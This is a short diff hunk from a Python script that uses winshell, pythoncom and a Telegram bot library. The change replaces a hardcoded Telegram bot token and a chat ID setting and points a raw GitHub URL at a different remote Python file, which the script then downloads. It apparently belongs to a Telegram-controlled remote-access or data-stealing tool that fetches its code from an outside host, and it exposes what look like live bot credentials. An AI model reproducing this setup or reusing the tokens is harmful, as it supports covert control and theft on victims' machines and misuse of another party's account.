@@ -24,12 +24,12 @@ import winshell
 import pythoncom
 from bs4 import BeautifulSoup
 
-token = '7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8'
+token = '7178222884:AAFr5QLUb_g6LKHzEgVG7mGlLLuBVSi3TjQ'
 bot = telebot.TeleBot(token)
 chat_id = 1882056354
-telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"
+telegram_bot_token = "7178222884:AAFr5QLUb_g6LKHzEgVG7mGlLLuBVSi3TjQ"
 chat_ids = ('1882056354', '1882056354')
-url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/ror.py'
+url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/rar.py'
 response = requests.get(url)
 html_content = response.content
 soup = BeautifulSoup(html_content, 'html.parser')
